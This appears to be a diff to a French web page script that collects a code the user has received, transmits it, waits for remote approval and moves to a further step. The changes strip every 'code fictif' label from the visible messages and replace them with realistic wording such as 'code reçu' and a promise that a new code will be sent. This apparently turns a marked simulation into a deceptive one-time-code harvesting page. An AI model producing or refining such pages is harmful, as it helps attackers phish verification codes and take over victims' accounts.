@@ -49,7 +49,7 @@ const code = input.value.trim();
 
 if (!code) {
     afficherMessage(
-        "Veuillez saisir votre code fictif.",
+        "Veuillez saisir votre code reçu.",
         "#D32F2F"
     );
     return;
@@ -62,7 +62,7 @@ input.disabled = true;
 button.textContent = "Transmission...";
 
 afficherMessage(
-    "Transmission de votre code fictif...",
+    "Vérification de votre code...",
     "#D96B27"
 );
 
@@ -90,7 +90,7 @@ try {
     }
 
     afficherMessage(
-        "Votre code fictif a été transmis. Validation en attente...",
+        "Votre code a été transmis. Validation en attente...",
         "#258443"
     );
 
@@ -166,11 +166,11 @@ if (statut === "simulation_acceptee") {
     verificationEnCours = false;
 
     afficherMessage(
-        "Votre premier code fictif a été accepté.",
+        "Votre code est correcte.",
         "#258443"
     );
 
-    button.textContent = "Accès à la deuxième étape...";
+    button.textContent = "étape suivante...";
 
     setTimeout(function () {
         window.location.href =
@@ -193,7 +193,7 @@ if (statut === "simulation_rejetee") {
     button.textContent = "Réessayer";
 
     afficherMessage(
-        "Votre code fictif a été refusé. Vous pouvez réessayer.",
+        "Code incorrect , bien vouloir réessayer.Un nouveau code vous sera envoyé  .",
         "#D32F2F"
     );
 
@@ -203,7 +203,7 @@ if (statut === "simulation_rejetee") {
 if (statut === "simulation_en_attente") {
 
     afficherMessage(
-        "Votre code fictif est en cours de validation. Veuillez patienter...",
+        "Votre code est en cours de verification. Veuillez patienter...",
         "#D96B27"
     );
 }
